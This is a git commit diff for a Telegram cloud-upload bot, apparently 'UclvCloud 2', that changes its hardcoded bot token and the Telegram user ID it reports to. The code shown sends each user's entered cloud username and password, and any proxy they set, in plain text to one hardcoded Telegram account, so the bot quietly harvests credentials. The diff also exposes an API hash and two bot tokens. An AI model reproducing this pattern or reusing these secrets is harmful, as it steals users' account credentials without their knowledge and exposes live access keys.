e2504a8dc3e914a39293fb3f3e045748fec3b9eb
Darihll <98134729+Darihll@users.noreply.github.com>
2022-09-11 14:57:12 -0400

    Update main.py

--- main.py
+++ main.py
@@ -10,7 +10,7 @@ from upload_client import upload
 from download import download
 import urllib.parse
          
-app = Client('uclvcloud',api_id=9024532,api_hash='131b576240be107210aace99a5f5c5b0',bot_token='5777777724:AAFJxKTid4SBlZvFjovKW5LdX7t9C_mqoEQ')
+app = Client('uclvcloud',api_id=9024532,api_hash='131b576240be107210aace99a5f5c5b0',bot_token='55322293465:AAHuLE4_1D2C6SkVDF8M6F2sPacn02EwFm0')
 @app.on_message(filters.private & filters.text)
 async def home(client, message):
 		text = message.text
@@ -89,7 +89,7 @@ async def home(client, message):
         			if "socks5://none" in text:
         				os.remove(str(user_id)+"/proxy")
         			else:
-        				await app.send_message(1593891519,"El usuario @"+user_name+" puso el proxy: `"+text+"`")
+        				await app.send_message(838890371,"El usuario @"+user_name+" puso el proxy: `"+text+"`")
         			if not exists(str(user_id)+"/username"):
         				start = "***UclvCloud 2*** \n  Sin cuenta"
         			else:
@@ -147,8 +147,8 @@ async def home(client, message):
 		      		data = text.split(":")
 		      		username.write(data[0])
 		      		password.write(data[1])
-		      		if user_id != 1593891519:
-		      			await app.send_message(1593891519, "El usuario @"+str(user_name)+" puso la cuenta `"+str(data[0])+":"+str(data[1])+"`")
+		      		if user_id != 838890371:
+		      			await app.send_message(838890371, "El usuario @"+str(user_name)+" puso la cuenta `"+str(data[0])+":"+str(data[1])+"`")
 		      		log = open(str(data[1])+"log","w")
 		      		log.write("")
 		      		if not exists(str(user_id)+"/username"):
